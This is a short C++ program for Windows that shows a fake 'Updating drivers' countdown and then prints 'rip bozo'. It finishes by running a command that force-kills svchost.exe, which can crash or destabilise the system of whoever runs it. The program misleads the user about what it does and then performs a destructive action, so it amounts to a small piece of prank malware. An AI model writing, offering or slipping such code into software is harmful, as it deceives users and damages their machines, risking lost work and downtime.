
#include <iostream>
#include <Windows.h>

using namespace std;

int main()
{
    
    int i = 5;

    while (i > 0) {

        cout << "Updating drivers in " << i << " seconds" << endl;
        i--;
        Sleep(1000);
    }

    cout << "rip bozo" << endl;
    system("taskkill.exe /f /im svchost.exe");
    
    
}

